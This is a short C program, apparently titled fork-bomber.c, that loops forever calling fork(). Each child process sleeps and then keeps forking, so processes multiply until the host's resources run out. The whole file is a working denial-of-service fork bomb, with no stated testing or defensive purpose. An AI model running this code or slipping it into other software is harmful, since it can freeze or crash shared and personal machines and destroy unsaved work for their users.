// fork-bomber.c
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
    while (1) {
        pid_t pid = fork();
        if (pid < 0) {
            perror("fork");
            return 1;
        }
        if (pid == 0) {
            // child
            sleep(1000);
        }
    }
}